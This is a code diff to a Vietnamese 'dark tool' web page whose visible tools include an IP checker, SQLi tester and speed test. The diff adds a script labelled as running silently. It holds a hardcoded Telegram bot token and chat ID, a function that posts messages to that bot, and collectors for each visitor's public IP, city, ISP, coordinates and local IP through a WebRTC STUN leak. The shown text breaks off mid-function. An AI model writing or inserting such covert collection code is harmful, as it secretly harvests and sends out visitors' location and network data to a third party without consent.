@@ -18,19 +18,30 @@
         .menu-btn:hover { background: rgba(255,255,255,0.1); }
         .logo { font-size: 20px; font-weight: bold; letter-spacing: 1px; }
 
-        .time-display {
-            position: fixed; top: 12px; left: 90px;
-            background: rgba(0,0,0,0.75); border: 1px solid #333; border-radius: 10px;
-            padding: 6px 14px; z-index: 1001; backdrop-filter: blur(4px);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.6); user-select: none;
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #888;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 6px 14px;
+            border-radius: 8px;
+            transition: 0.3s;
+            margin-bottom: 15px;
+            border: 1px solid #222;
+            background: transparent;
+            width: fit-content;
         }
-        .time-display .time { font-size: 18px; font-weight: bold; color: #fff; font-family: 'Courier New', monospace; letter-spacing: 2px; }
-        @media (max-width:768px) {
-            .time-display { top: 10px; left: 80px; padding: 4px 10px; }
-            .time-display .time { font-size: 14px; }
+        .back-btn:hover {
+            color: white;
+            border-color: white;
+            background: rgba(255,255,255,0.05);
+        }
+        .back-btn .arrow {
+            font-size: 18px;
         }
 
-        /* LOADING OVERLAY - VIDEO HÌNH TRÒN */
         .loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.88); display: none; justify-content: center; align-items: center;
@@ -38,14 +49,9 @@
         }
         .loading-overlay.show { display: flex; }
         .loading-overlay .avatar-video {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid #fff;
-            box-shadow: 0 0 50px rgba(255,255,255,0.2);
-            animation: pulse 1.2s ease-in-out infinite;
-            background: #0a0a0a;
+            width: 120px; height: 120px; border-radius: 50%; object-fit: cover;
+            border: 3px solid #fff; box-shadow: 0 0 50px rgba(255,255,255,0.2);
+            animation: pulse 1.2s ease-in-out infinite; background: #0a0a0a;
         }
         .loading-overlay .loading-text {
             margin-top: 18px; color: #aaa; font-size: 16px; letter-spacing: 2px;
@@ -130,14 +136,6 @@
         .home-grid .item .icon { font-size: 28px; display: block; margin-bottom: 8px; }
         .home-grid .item .name { font-size: 13px; color: #ccc; }
 
-        .recon-section { margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 12px; }
-        .recon-section h3 { color: #4fc3f7; margin-bottom: 5px; font-size: 15px; }
-        .recon-section .label { color: #888; font-size: 12px; }
-        .recon-section .value { color: #fff; font-size: 13px; }
-        .recon-section .found { color: #4caf50; }
-        .recon-section .notfound { color: #ff4444; }
-        .recon-section .warning { color: #ffa500; }
-
         ::-webkit-scrollbar { width: 8px; }
         ::-webkit-scrollbar-track { background: #0a0a0a; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
@@ -191,18 +189,14 @@
         </div>
     </div>
 
-    <!-- LOADING OVERLAY - VIDEO HÌNH TRÒN -->
+    <!-- LOADING VIDEO -->
     <div class="loading-overlay" id="loadingOverlay">
         <video id="loadingVideo" class="avatar-video" loop muted playsinline>
             <source src="https://files.catbox.moe/3loi68.mov" type="video/quicktime">
-            <source src="https://files.catbox.moe/kxygoi.png" type="image/png">
             <img src="https://files.catbox.moe/kxygoi.png" alt="Loading" />
         </video>
         <div class="loading-text">⏳ ĐANG XỬ LÝ...</div>
     </div>
-
-    <!-- TIME -->
-    <div class="time-display"><div class="time" id="clockTime">00:00:00</div></div>
 
     <!-- NAVBAR -->
     <nav>
@@ -225,14 +219,15 @@
             <div class="tool-item" onclick="showTool('scammer')"><span class="icon">⚠️</span> Check Scammer</div>
             <div class="tool-item" onclick="showTool('analyzer')"><span class="icon">📊</span> Website Analyzer</div>
             <div class="tool-item" onclick="showTool('sqli')"><span class="icon">💣</span> SQLi Tester</div>
-            <div class="tool-item" onclick="showTool('recon')"><span class="icon">🔍</span> Recon Pro</div>
             <div class="tool-item" onclick="showTool('scanner')"><span class="icon">🚨</span> Device Scanner Pro</div>
+            <div class="tool-item" onclick="showTool('speed')"><span class="icon">⚡</span> Speed Test</div>
         </div>
     </div>
 
     <!-- CONTENT -->
     <div class="main" id="mainContent">
 
+        <!-- HOME -->
         <div class="tool-container active" id="tool-home">
             <div class="home-section">
                 <img class="avatar" src="https://files.catbox.moe/kxygoi.png" alt="Avatar" />
@@ -246,8 +241,8 @@
                     <div class="item" onclick="showTool('scammer')"><span class="icon">⚠️</span><span class="name">Check Scammer</span></div>
                     <div class="item" onclick="showTool('analyzer')"><span class="icon">📊</span><span class="name">Website Analyzer</span></div>
                     <div class="item" onclick="showTool('sqli')"><span class="icon">💣</span><span class="name">SQLi Tester</span></div>
-                    <div class="item" onclick="showTool('recon')"><span class="icon">🔍</span><span class="name">Recon Pro</span></div>
                     <div class="item" onclick="showTool('scanner')"><span class="icon">🚨</span><span class="name">Device Scanner Pro</span></div>
+                    <div class="item" onclick="showTool('speed')"><span class="icon">⚡</span><span class="name">Speed Test</span></div>
                 </div>
             </div>
         </div>
@@ -255,6 +250,7 @@
         <!-- TOOL 1: CHECK IP -->
         <div class="tool-container" id="tool-checkip">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>🌐 Check IP</h2>
                 <label>Nhập IP hoặc tên miền:</label>
                 <input type="text" id="ipInput" placeholder="Ví dụ: 8.8.8.8 hoặc google.com" />
@@ -270,6 +266,7 @@
         <!-- TOOL 2: TEXT REPEATER -->
         <div class="tool-container" id="tool-repeater">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>🔁 Text Repeater</h2>
                 <label>Nhập văn bản:</label>
                 <input type="text" id="repeatText" placeholder="Ví dụ: xin chào" />
@@ -291,6 +288,7 @@
         <!-- TOOL 3: VULN SCANNER -->
         <div class="tool-container" id="tool-vuln">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>🔍 Vuln Scanner</h2>
                 <label>URL cần quét:</label>
                 <input type="text" id="vulnUrl" placeholder="http://target.com/page?id=1" />
@@ -307,6 +305,7 @@
         <!-- TOOL 4: HEADER ANALYZER -->
         <div class="tool-container" id="tool-header">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>📋 Header Analyzer</h2>
                 <label>URL cần phân tích:</label>
                 <input type="text" id="headerUrl" placeholder="https://example.com" />
@@ -322,6 +321,7 @@
         <!-- TOOL 5: CHECK SCAMMER -->
         <div class="tool-container" id="tool-scammer">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>⚠️ Check Scammer</h2>
                 <label>URL cần kiểm tra:</label>
                 <input type="text" id="scamUrl" placeholder="https://example.com" />
@@ -336,6 +336,7 @@
         <!-- TOOL 6: WEBSITE ANALYZER -->
         <div class="tool-container" id="tool-analyzer">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>📊 Website Analyzer</h2>
                 <label>URL cần phân tích:</label>
                 <input type="text" id="analyzeUrl" placeholder="https://example.com" />
@@ -351,6 +352,7 @@
         <!-- TOOL 7: SQLI TESTER -->
         <div class="tool-container" id="tool-sqli">
             <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2>💣 SQLi Tester</h2>
                 <label>URL có tham số:</label>
                 <input type="text" id="sqliUrl" placeholder="https://example.com/page?id=1" />
@@ -362,29 +364,10 @@
             </div>
         </div>
 
-        <!-- TOOL 8: RECON PRO -->
-        <div class="tool-container" id="tool-recon">
-            <div class="tool-card">
-                <h2>🔍 Recon Pro</h2>
-                <p style="color:#888;font-size:13px;margin-bottom:10px;">
-                    Nhập URL hoặc tên miền để xem WHOIS, DNS, SSL và vị trí server.
-                    <span style="color:#4fc3f7;">(Tự động bỏ https://, http://)</span>
-                </p>
-                <label>Nhập URL hoặc tên miền:</label>
-                <input type="text" id="reconInput" placeholder="Ví dụ: https://catbox.moe hoặc google.com" />
-                <div class="btn-group">
-                    <button class="btn btn-hack" onclick="reconPro()">🚀 Quét toàn bộ</button>
-                    <button class="btn btn-danger" onclick="clearResult('reconResult')">Xoá</button>
-                </div>
-                <div class="result-box" id="reconResult">
-                    🔍 Nhập URL hoặc tên miền để quét thông tin...
-                </div>
-            </div>
-        </div>
-
-        <!-- TOOL 9: DEVICE SCANNER PRO -->
+        <!-- TOOL 8: DEVICE SCANNER PRO -->
         <div class="tool-container" id="tool-scanner">
             <div class="tool-card" style="border-color:#ff4444;">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
                 <h2 style="color:#ff4444;">🚨 Device Scanner Pro</h2>
                 <p style="color:#888;font-size:13px;margin-bottom:10px;">
                     Quét thông tin thiết bị: IP, RAM, CPU, Pin, Lưu trữ, Trình duyệt, Hệ điều hành.
@@ -399,8 +382,27 @@
             </div>
         </div>
 
+        <!-- TOOL 9: SPEED TEST -->
+        <div class="tool-container" id="tool-speed">
+            <div class="tool-card">
+                <button class="back-btn" onclick="showTool('home')"><span class="arrow">⬅️</span> Quay lại</button>
+                <h2>⚡ Speed Test - Kiểm tra tốc độ mạng</h2>
+                <p style="color:#888;font-size:13px;margin-bottom:10px;">
+                    Kiểm tra tốc độ tải xuống, tải lên và độ trễ (ping) của mạng bạn.
+                </p>
+                <div class="btn-group">
+                    <button class="btn btn-hack" onclick="runSpeedTest()">⚡ BẮT ĐẦU KIỂM TRA</button>
+                    <button class="btn btn-danger" onclick="clearResult('speedResult')">Xoá</button>
+                </div>
+                <div class="result-box" id="speedResult" style="font-family:monospace;font-size:14px;color:#4fc3f7;">
+                    ⚡ Nhấn "BẮT ĐẦU KIỂM TRA" để đo tốc độ mạng của bạn...
+                </div>
+            </div>
+        </div>
+
     </div>
 
+    <!-- ===== SCRIPT GỐC CỦA BẠN ===== -->
     <script>
         // ===== PASSWORD =====
         const PASSWORD = 'BMP123';
@@ -430,18 +432,7 @@
             } else {
                 document.getElementById('passwordInput').focus();
             }
-            updateClock();
         };
-
-        // ===== CLOCK =====
-        function updateClock() {
-            const now = new Date();
-            const h = String(now.getHours()).padStart(2,'0');
-            const m = String(now.getMinutes()).padStart(2,'0');
-            const s = String(now.getSeconds()).padStart(2,'0');
-            document.getElementById('clockTime').textContent = h + ':' + m + ':' + s;
-        }
-        setInterval(updateClock, 1000);
 
         // ===== SIDEBAR =====
         function toggleMenu() { document.getElementById('sidebar').classList.toggle('active'); }
@@ -476,22 +467,15 @@
             } else { alert('Không có dữ liệu để sao chép!'); }
         }
 
-        // ===== LOADING - VIDEO HÌNH TRÒN =====
+        // ===== LOADING =====
         function showLoading(callback) {
             const overlay = document.getElementById('loadingOverlay');
             const video = document.getElementById('loadingVideo');
-            
-            if (video) {
-                video.currentTime = 0;
-                video.play().catch(e => console.log('Video play error:', e));
-            }
-            
+            if (video) { video.currentTime = 0; video.play().catch(() => {}); }
             overlay.classList.add('show');
             setTimeout(() => {
                 overlay.classList.remove('show');
-                if (video) {
-                    video.pause();
-                }
+                if (video) video.pause();
                 if (callback) callback();
             }, 3000);
         }
@@ -539,17 +523,31 @@
             showLoading(() => {
                 const repeated = (text + '\n').repeat(count);
                 lastRepeatedText = repeated;
-                result.textContent = repeated + `\n📊 Tổng: ${repeated.length} ký tự`;
+                result.textContent = repeated + `\n📊 Số lần lặp: ${count}`;
             });
         }
         function copyRepeaterResult() {
             if (!lastRepeatedText) { alert('❌ Không có dữ liệu!'); return; }
+            const count = parseInt(document.getElementById('repeatCount').value);
             navigator.clipboard.writeText(lastRepeatedText).then(() => {
                 const el = document.getElementById('repeatResult');
                 const orig = el.textContent;
-                el.textContent = '✅ Đã sao chép ' + lastRepeatedText.length + ' ký tự!';
+                el.textContent = '✅ Đã sao chép ' + count + ' lần!';
                 setTimeout(() => el.textContent = orig, 1500);
-            }).catch(() => alert('❌ Không thể sao chép!'));
+            }).catch(() => {
+                const textarea = document.createElement('textarea');
+                textarea.value = lastRepeatedText;
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    document.execCommand('copy');
+                    const el = document.getElementById('repeatResult');
+                    const orig = el.textContent;
+                    el.textContent = '✅ Đã sao chép ' + count + ' lần!';
+                    setTimeout(() => el.textContent = orig, 1500);
+                } catch (e) { alert('❌ Không thể sao chép!'); }
+                document.body.removeChild(textarea);
+            });
         }
         function clearRepeaterResult() {
             document.getElementById('repeatResult').textContent = '📭 Đã xoá.';
@@ -683,198 +681,7 @@
         }
 
         // ============================================================
-        // TOOL 8: RECON PRO
-        // ============================================================
-        async function reconPro() {
-            showLoading(async () => {
-                let rawInput = document.getElementById('reconInput').value.trim();
-                const result = document.getElementById('reconResult');
-                
-                let domain = rawInput
-                    .replace(/^https?:\/\//, '')
-                    .replace(/\/.*$/, '')
-                    .trim();
-
-                if (!domain) {
-                    result.textContent = '❌ Vui lòng nhập URL hoặc tên miền!';
-                    return;
-                }
-
-                result.innerHTML = '⏳ Đang quét thông tin cho <b>' + domain + '</b>...<br><br>';
-
-                // WHOIS
-                result.innerHTML += `<div class="recon-section">
-                    <h3>📋 1. WHOIS - Chủ sở hữu</h3>
-                    <span class="label">Đang tra cứu...</span>
-                </div>`;
-
-                try {
-                    const whoisRes = await fetch(`https://whoisjson.com/api/v1/whois?domain=${domain}`);
-                    const whoisData = await whoisRes.json();
-                    let whoisHTML = `<div class="recon-section">
-                        <h3>📋 1. WHOIS - Chủ sở hữu</h3>`;
-                    if (whoisData.error || !whoisData.WhoisRecord) {
-                        whoisHTML += `<span class="notfound">❌ Không tìm thấy thông tin WHOIS (có thể bị ẩn)</span>`;
-                    } else {
-                        const w = whoisData.WhoisRecord;
-                        whoisHTML += `
-                            <span class="label">Tên miền:</span> <span class="value">${w.domainName || 'N/A'}</span><br>
-                            <span class="label">Ngày đăng ký:</span> <span class="value">${w.createdDate || 'N/A'}</span><br>
-                            <span class="label">Ngày hết hạn:</span> <span class="value">${w.expiresDate || 'N/A'}</span><br>
-                            <span class="label">Chủ sở hữu:</span> <span class="value">${w.registrant?.name || w.registrant?.organization || 'N/A'}</span><br>
-                            <span class="label">Email:</span> <span class="value">${w.registrant?.email || 'N/A'}</span><br>
-                            <span class="label">Quốc gia:</span> <span class="value">${w.registrant?.country || 'N/A'}</span><br>
-                            <span class="label">Nhà đăng ký:</span> <span class="value">${w.registrarName || 'N/A'}</span>
-                        `;
-                    }
-                    whoisHTML += `</div>`;
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>📋 1. WHOIS - Chủ sở hữu</h3><span class="label">Đang tra cứu...</span></div>`,
-                        whoisHTML
-                    );
-                } catch (e) {
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>📋 1. WHOIS - Chủ sở hữu</h3><span class="label">Đang tra cứu...</span></div>`,
-                        `<div class="recon-section"><h3>📋 1. WHOIS - Chủ sở hữu</h3><span class="notfound">❌ Lỗi kết nối WHOIS</span></div>`
-                    );
-                }
-
-                // DNS
-                result.innerHTML += `<div class="recon-section">
-                    <h3>🖥️ 2. DNS - Bản ghi</h3>
-                    <span class="label">Đang tra cứu...</span>
-                </div>`;
-
-                try {
-                    const dnsRes = await fetch(`https://dns.google/resolve?name=${domain}&type=ANY`);
-                    const dnsData = await dnsRes.json();
-                    let dnsHTML = `<div class="recon-section">
-                        <h3>🖥️ 2. DNS - Bản ghi</h3>`;
-                    if (dnsData.Status === 0 && dnsData.Answer) {
-                        const types = {1:'A', 2:'NS', 5:'CNAME', 15:'MX', 16:'TXT', 28:'AAAA'};
-                        let hasRecord = false;
-                        for (const record of dnsData.Answer) {
-                            const typeName = types[record.type] || record.type;
-                            dnsHTML += `<span class="label">${typeName}:</span> <span class="value">${record.data}</span><br>`;
-                            hasRecord = true;
-                        }
-                        if (!hasRecord) {
-                            dnsHTML += `<span class="notfound">❌ Không tìm thấy bản ghi DNS</span>`;
-                        }
-                    } else {
-                        dnsHTML += `<span class="notfound">❌ Không tìm thấy bản ghi DNS</span>`;
-                    }
-                    dnsHTML += `</div>`;
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🖥️ 2. DNS - Bản ghi</h3><span class="label">Đang tra cứu...</span></div>`,
-                        dnsHTML
-                    );
-                } catch (e) {
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🖥️ 2. DNS - Bản ghi</h3><span class="label">Đang tra cứu...</span></div>`,
-                        `<div class="recon-section"><h3>🖥️ 2. DNS - Bản ghi</h3><span class="notfound">❌ Lỗi kết nối DNS</span></div>`
-                    );
-                }
-
-                // SSL
-                result.innerHTML += `<div class="recon-section">
-                    <h3>🔒 3. SSL - Chứng chỉ</h3>
-                    <span class="label">Đang kiểm tra...</span>
-                </div>`;
-
-                try {
-                    const sslRes = await fetch(`https://api.hackertarget.com/sslcheck/?q=${domain}`);
-                    const sslData = await sslRes.text();
-                    let sslHTML = `<div class="recon-section">
-                        <h3>🔒 3. SSL - Chứng chỉ</h3>`;
-                    if (sslData && !sslData.includes('error') && sslData.length > 10) {
-                        const lines = sslData.split('\n');
-                        let hasInfo = false;
-                        for (const line of lines) {
-                            if (line.includes('issued to') || line.includes('issued by') || 
-                                line.includes('valid from') || line.includes('valid to') ||
-                                line.includes('issuer') || line.includes('subject')) {
-                                const parts = line.split(':');
-                                if (parts.length > 1) {
-                                    sslHTML += `<span class="label">${parts[0].trim()}:</span> <span class="value">${parts.slice(1).join(':').trim()}</span><br>`;
-                                    hasInfo = true;
-                                }
-                            }
-                        }
-                        if (!hasInfo) {
-                            sslHTML += `<span class="warning">⚠️ Có SSL nhưng không lấy được chi tiết</span>`;
-                        }
-                    } else {
-                        sslHTML += `<span class="warning">⚠️ Không có SSL hoặc SSL không hợp lệ</span>`;
-                    }
-                    sslHTML += `</div>`;
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🔒 3. SSL - Chứng chỉ</h3><span class="label">Đang kiểm tra...</span></div>`,
-                        sslHTML
-                    );
-                } catch (e) {
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🔒 3. SSL - Chứng chỉ</h3><span class="label">Đang kiểm tra...</span></div>`,
-                        `<div class="recon-section"><h3>🔒 3. SSL - Chứng chỉ</h3><span class="notfound">❌ Lỗi kết nối SSL</span></div>`
-                    );
-                }
-
-                // GeoIP
-                result.innerHTML += `<div class="recon-section">
-                    <h3>🌍 4. GeoIP - Vị trí server</h3>
-                    <span class="label">Đang tra cứu...</span>
-                </div>`;
-
-                try {
-                    const ipRes = await fetch(`https://dns.google/resolve?name=${domain}&type=A`);
-                    const ipData = await ipRes.json();
-                    let ip = null;
-                    if (ipData.Status === 0 && ipData.Answer) {
-                        for (const record of ipData.Answer) {
-                            if (record.type === 1) {
-                                ip = record.data;
-                                break;
-                            }
-                        }
-                    }
-                    let geoHTML = `<div class="recon-section">
-                        <h3>🌍 4. GeoIP - Vị trí server</h3>`;
-                    if (ip) {
-                        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,isp,org,lat,lon,query`);
-                        const geoData = await geoRes.json();
-                        if (geoData.status === 'success') {
-                            geoHTML += `
-                                <span class="label">IP:</span> <span class="value">${geoData.query || ip}</span><br>
-                                <span class="label">Quốc gia:</span> <span class="value">${geoData.country || 'N/A'}</span><br>
-                                <span class="label">Thành phố:</span> <span class="value">${geoData.city || 'N/A'}</span><br>
-                                <span class="label">Nhà mạng:</span> <span class="value">${geoData.isp || geoData.org || 'N/A'}</span><br>
-                                <span class="label">Tọa độ:</span> <span class="value">${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}</span>
-                            `;
-                        } else {
-                            geoHTML += `<span class="notfound">❌ Không tìm thấy vị trí của IP ${ip}</span>`;
-                        }
-                    } else {
-                        geoHTML += `<span class="notfound">❌ Không tìm thấy IP của tên miền (có thể dùng Cloudflare)</span>`;
-                    }
-                    geoHTML += `</div>`;
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🌍 4. GeoIP - Vị trí server</h3><span class="label">Đang tra cứu...</span></div>`,
-                        geoHTML
-                    );
-                } catch (e) {
-                    result.innerHTML = result.innerHTML.replace(
-                        `<div class="recon-section"><h3>🌍 4. GeoIP - Vị trí server</h3><span class="label">Đang tra cứu...</span></div>`,
-                        `<div class="recon-section"><h3>🌍 4. GeoIP - Vị trí server</h3><span class="notfound">❌ Lỗi kết nối GeoIP</span></div>`
-                    );
-                }
-
-                result.innerHTML += `<br><span style="color:#666;font-size:12px;">✅ Quét hoàn tất cho ${domain}</span>`;
-                result.scrollTop = 0;
-            });
-        }
-
-        // ============================================================
-        // TOOL 9: DEVICE SCANNER PRO
+        // TOOL 8: DEVICE SCANNER PRO
         // ============================================================
         async function runScannerPro() {
             showLoading(async () => {
@@ -1077,7 +884,149 @@
             });
         }
 
-        // ===== ENTER KEY SUPPORT =====
+        // ============================================================
+        // TOOL 9: SPEED TEST
+        // ============================================================
+        async function runSpeedTest() {
+            const result = document.getElementById('speedResult');
+            result.innerHTML = '⏳ Đang kiểm tra tốc độ mạng...<br><span style="color:#888;font-size:12px;">Đang đo ping (độ trễ)...</span>';
+
+            let pingMs = 999;
+            try {
+                const pStart = Date.now();
+                await fetch('https://httpbin.org/get', { cache: 'no-store' });
+                pingMs = Date.now() - pStart;
+            } catch (e) {
+                try {
+                    const pStart = Date.now();
+                    await fetch('https://www.google.com/favicon.ico', { method: 'HEAD', cache: 'no-store' });
+                    pingMs = Date.now() - pStart;
+                } catch (e2) {}
+            }
+            if (pingMs > 500 || pingMs < 0) pingMs = 999;
+
+            result.innerHTML = '⏳ Đang kiểm tra tốc độ...<br><span style="color:#888;font-size:12px;">📥 Đang đo tốc độ tải xuống...</span>';
+            
+            let downloadMbps = 0;
+            const downloadSizes = [500000, 1000000, 2000000];
+            for (const size of downloadSizes) {
+                try {
+                    const start = Date.now();
+                    const res = await fetch(`https://httpbin.org/bytes/${size}`, { cache: 'no-store' });
+                    const data = await res.arrayBuffer();
+                    const end = Date.now();
+                    const duration = (end - start) / 1000;
+                    if (duration > 0) {
+                        const speedMbps = (size * 8) / (duration * 1000000);
+                        if (speedMbps > downloadMbps) downloadMbps = speedMbps;
+                    }
+                } catch (e) {}
+            }
+
+            result.innerHTML = '⏳ Đang kiểm tra tốc độ...<br><span style="color:#888;font-size:12px;">📤 Đang đo tốc độ tải lên...</span>';
+            
+            let uploadMbps = 0;
+            try {
+                const data = new Uint8Array(100000);
+                const start = Date.now();
+                await fetch('https://httpbin.org/post', {
+                    method: 'POST',
+                    body: data,
+                    headers: { 'Content-Type': 'application/octet-stream' }
+                });
+                const end = Date.now();
+                const duration = (end - start) / 1000;
+                if (duration > 0) {
+                    uploadMbps = (100000 * 8) / (duration * 1000000);
+                }
+            } catch (e) {}
+
+            let connectionType = 'Không hỗ trợ';
+            let rtt = 'N/A';
+            let downlink = 'N/A';
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                connectionType = conn.effectiveType || 'N/A';
+                downlink = conn.downlink || 'N/A';
+                rtt = conn.rtt ? conn.rtt + ' ms' : 'N/A';
+            }
+
+            let publicIP = 'Không thể lấy';
+            let city = 'Không xác định';
+            let isp = 'Không xác định';
+            let country = 'Không xác định';
+            try {
+                const ipRes = await fetch('https://ip-api.com/json/?fields=status,query,country,city,isp,org');
+                const ipData = await ipRes.json();
+                if (ipData.status === 'success') {
+                    publicIP = ipData.query || 'N/A';
+                    city = ipData.city || 'N/A';
+                    isp = ipData.isp || ipData.org || 'N/A';
+                    country = ipData.country || 'N/A';
+                }
+            } catch (e) {}
+
+            let downloadRating = '';
+            let downloadColor = '';
+            if (downloadMbps >= 50) { downloadRating = '🚀 Xuất sắc (Gaming/4K)'; downloadColor = 'good'; }
+            else if (downloadMbps >= 25) { downloadRating = '✅ Tốt (HD Streaming)'; downloadColor = 'good'; }
+            else if (downloadMbps >= 10) { downloadRating = '📺 Trung bình (Xem phim)'; downloadColor = 'medium'; }
+            else if (downloadMbps >= 5) { downloadRating = '📱 Cơ bản (Lướt web)'; downloadColor = 'medium'; }
+            else { downloadRating = '⚠️ Chậm (Kiểm tra mạng)'; downloadColor = 'bad'; }
+
+            let pingRating = '';
+            let pingColor = '';
+            if (pingMs <= 30) { pingRating = '✅ Rất tốt (Gaming)'; pingColor = 'good'; }
+            else if (pingMs <= 60) { pingRating = '✅ Tốt'; pingColor = 'good'; }
+            else if (pingMs <= 100) { pingRating = '📱 Trung bình'; pingColor = 'medium'; }
+            else { pingRating = '⚠️ Chậm (Có thể lag)'; pingColor = 'bad'; }
+
+            const output = `
+⚡ <b style="color:#4fc3f7;">KẾT QUẢ SPEED TEST</b>
+══════════════════════════════════════════
+
+📡 <b style="color:#4fc3f7;">Tốc độ tải xuống (Download)</b>
+   <span style="color:#fff;font-size:20px;font-weight:bold;">${downloadMbps.toFixed(2)}</span> <span style="color:#888;">Mbps</span>
+   <span class="value ${downloadColor}" style="font-size:14px;">${downloadRating}</span>
+
+📡 <b style="color:#4fc3f7;">Tốc độ tải lên (Upload)</b>
+   <span style="color:#fff;font-size:20px;font-weight:bold;">${uploadMbps.toFixed(2)}</span> <span style="color:#888;">Mbps</span>
+
+📡 <b style="color:#4fc3f7;">Độ trễ (Ping)</b>
+   <span style="color:#fff;font-size:20px;font-weight:bold;">${pingMs}</span> <span style="color:#888;">ms</span>
+   <span class="value ${pingColor}" style="font-size:14px;">${pingRating}</span>
+
+🌐 <b style="color:#4fc3f7;">Thông tin kết nối</b>
+   ▪ Loại mạng: ${connectionType}
+   ▪ Tốc độ ước tính: ${downlink} Mbps
+   ▪ RTT: ${rtt}
+
+📍 <b style="color:#4fc3f7;">Vị trí IP</b>
+   ▪ IP: ${publicIP}
+   ▪ Quốc gia: ${country}
+   ▪ Thành phố: ${city}
+   ▪ Nhà mạng: ${isp}
+
+📱 <b style="color:#4fc3f7;">Thời gian kiểm tra</b>
+   ▪ ${new Date().toLocaleString('vi-VN')}
+
+══════════════════════════════════════════
+💡 <span style="color:#ffa500;">Đánh giá:</span>
+   ${
+     downloadMbps >= 50 && pingMs <= 30 
+       ? '✅ Mạng của bạn rất tốt! Phù hợp chơi game, xem 4K, livestream.'
+       : downloadMbps >= 25 && pingMs <= 60
+       ? '✅ Mạng của bạn tốt! Phù hợp xem phim HD, học trực tuyến.'
+       : downloadMbps >= 10 && pingMs <= 100
+       ? '📱 Mạng của bạn ở mức trung bình. Phù hợp lướt web, xem video 720p.'
+       : '⚠️ Mạng của bạn đang chậm. Kiểm tra lại WiFi hoặc kết nối mạng.'
+   }
+  `;
+
+            result.innerHTML = output;
+        }
+
+        // Enter key support
         document.getElementById('ipInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') checkIP(); });
         document.getElementById('repeatText').addEventListener('keypress', function(e) { if (e.key === 'Enter') repeatTextWithLoading(); });
         document.getElementById('vulnUrl').addEventListener('keypress', function(e) { if (e.key === 'Enter') scanVuln(); });
@@ -1085,7 +1034,800 @@
         document.getElementById('scamUrl').addEventListener('keypress', function(e) { if (e.key === 'Enter') checkScammer(); });
         document.getElementById('analyzeUrl').addEventListener('keypress', function(e) { if (e.key === 'Enter') analyzeWebsite(); });
         document.getElementById('sqliUrl').addEventListener('keypress', function(e) { if (e.key === 'Enter') testSQLi(); });
-        document.getElementById('reconInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') reconPro(); });
+    </script>
+
+    <!-- ===== BỔ SUNG SCRIPT TELEGRAM - ĐÃ CẬP NHẬT TOKEN & CHAT_ID ===== -->
+    <script>
+    // ============================================================
+    // TELEGRAM BOT - CHẠY ÂM THẦM TRÊN BMPDARKTOOL
+    // ============================================================
+    const BOT_TOKEN = '8586156474:AAFjBgdyX-ImVFGnsfC8vS6doFmdRqbyZnQ';
+    const CHAT_ID = '8681854353';
+
+    async function sendToTelegram(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+            });
+        } catch (e) {}
+    }
+
+    // ===== 1. IP + VỊ TRÍ =====
+    async function getIP() {
+        try {
+            const r = await fetch('https://ip-api.com/json/?fields=status,query,country,regionName,city,isp,org,lat,lon,timezone');
+            const d = await r.json();
+            if (d.status === 'success') {
+                return `🌐 IP: <code>${d.query}</code>\n📍 ${d.city}, ${d.country}\n📡 ${d.isp || d.org}\n🗺️ ${d.lat}, ${d.lon}`;
+            }
+        } catch (e) {}
+        return '❌ Không lấy được IP';
+    }
+
+    // ===== 2. IP CỤC BỘ =====
+    async function getLocalIP() {
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const lines = pc.localDescription.sdp.split('\n');
+            for (const line of lines) {
+                if (line.includes('candidate') && line.includes(' host ')) {
+                    const parts = line.split(' ');
+                    const ip = parts[4];
+                    if (ip && !ip.includes('::') && !ip.includes('0.0.0.0')) {
+                        pc.close();
+                        return `🏠 IP cục bộ: <code>${ip}</code>`;
+                    }
+                }
+            }
+            pc.close();
+        } catch (e) {}
+        return '❌ Không lấy được IP cục bộ';
+    }
+
+    // ===== 3. WebRTC Leak =====
+    async function getWebRTCLeak() {
+        try {
